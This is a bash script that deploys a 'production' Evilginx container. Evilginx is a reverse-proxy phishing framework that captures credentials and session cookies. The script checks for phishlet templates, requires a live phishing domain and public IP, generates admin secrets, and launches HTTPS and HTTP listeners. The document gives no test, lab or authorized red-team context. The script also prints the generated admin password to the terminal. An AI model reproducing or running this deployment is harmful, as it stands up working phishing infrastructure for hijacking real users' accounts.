#!/bin/bash
# deploy.sh - Production deployment script for Evilginx Combined Container
# Run this on the production server

set -euo pipefail

PROJECT_DIR="/var/www/html/generalfetch"
ENV_FILE="${PROJECT_DIR}/.env"

echo "=== Evilginx Combined Container Deployment ==="
echo "Project directory: ${PROJECT_DIR}"

# Check if running as root or with docker permissions
if [ "$EUID" -ne 0 ] && ! groups | grep -q docker; then
    echo "ERROR: Run as root or add user to docker group"
    exit 1
fi

# Create project directory
mkdir -p "${PROJECT_DIR}"
cd "${PROJECT_DIR}"

# Create required directories
mkdir -p config/evilginx/phishlets config/evilginx/certs logs/evilginx

echo "=== Checking required files ==="
REQUIRED_FILES=(
    "docker-compose.yml"
    "Dockerfile.combined"
    "ui_requirements.txt"
    "ui_config.py"
    "evilginx-entrypoint.sh"
    "supervisord.conf"
)

for f in "${REQUIRED_FILES[@]}"; do
    if [ ! -f "${PROJECT_DIR}/${f}" ]; then
        echo "ERROR: Missing ${f} - copy from source"
        exit 1
    else
        echo "OK: ${f}"
    fi
done

# Check UI directory structure
if [ ! -d "${PROJECT_DIR}/ui" ]; then
    echo "ERROR: ui/ directory missing - copy from source"
    exit 1
fi

# Check phishlets
PHISHLET_COUNT=$(ls -1 config/evilginx/phishlets/*.yaml 2>/dev/null | wc -l)
if [ "${PHISHLET_COUNT}" -eq 0 ]; then
    echo "WARNING: No phishlets found in config/evilginx/phishlets/"
else
    echo "OK: Found ${PHISHLET_COUNT} phishlets"
fi

# Create .env from example if not exists
if [ ! -f "${ENV_FILE}" ]; then
    if [ -f "${PROJECT_DIR}/.env.example" ]; then
        cp "${PROJECT_DIR}/.env.example" "${ENV_FILE}"
        echo "Created .env from .env.example - EDIT IT WITH YOUR VALUES!"
    else
        echo "ERROR: .env.example not found"
        exit 1
    fi
else
    echo "OK: .env exists"
fi

# Generate secure secrets if not set
if grep -q "change-me-in-production" "${ENV_FILE}"; then
    echo "=== Generating secure secrets ==="
    SECRET_KEY=$(openssl rand -hex 32)
    UI_PASSWORD=$(openssl rand -base64 24 | tr -d "=+/" | cut -c1-32)
    
    sed -i "s/UI_SECRET_KEY=change-me-in-production-use-openssl-rand-hex-32/UI_SECRET_KEY=${SECRET_KEY}/" "${ENV_FILE}"
    sed -i "s/UI_PASSWORD=change-me-in-production/UI_PASSWORD=${UI_PASSWORD}/" "${ENV_FILE}"
    
    echo "Generated UI_SECRET_KEY and UI_PASSWORD in .env"
    echo "UI_PASSWORD: ${UI_PASSWORD}"
fi

# Load environment
set -a
source "${ENV_FILE}"
set +a

# Validate required env vars
REQUIRED_VARS=("EVILGINX_DOMAIN" "EVILGINX_EXTERNAL_IPV4")
for var in "${REQUIRED_VARS[@]}"; do
    if [ -z "${!var}" ] || [ "${!var}" = "yourdomain.com" ] || [ "${!var}" = "1.2.3.4" ]; then
        echo "ERROR: ${var} not set in .env - edit ${ENV_FILE}"
        exit 1
    fi
done

echo "=== Building combined image ==="
docker compose build

echo "=== Starting combined container ==="
docker compose up -d

echo "=== Waiting for health checks ==="
sleep 15

echo "=== Status ==="
docker compose ps

echo ""
echo "=== Deployment Complete ==="
echo "Web UI: http://localhost:5000 (or http://<server-ip>:5000 if port exposed)"
echo "Evilginx HTTPS: https://${EVILGINX_DOMAIN}:443"
echo "Evilginx HTTP: http://${EVILGINX_DOMAIN}:80"
echo ""
echo "Login:"
echo "  Username: ${UI_USERNAME:-admin}"
echo "  Password: ${UI_PASSWORD:-check .env}"
echo ""
echo "To view logs: docker compose logs -f"
echo "To stop: docker compose down"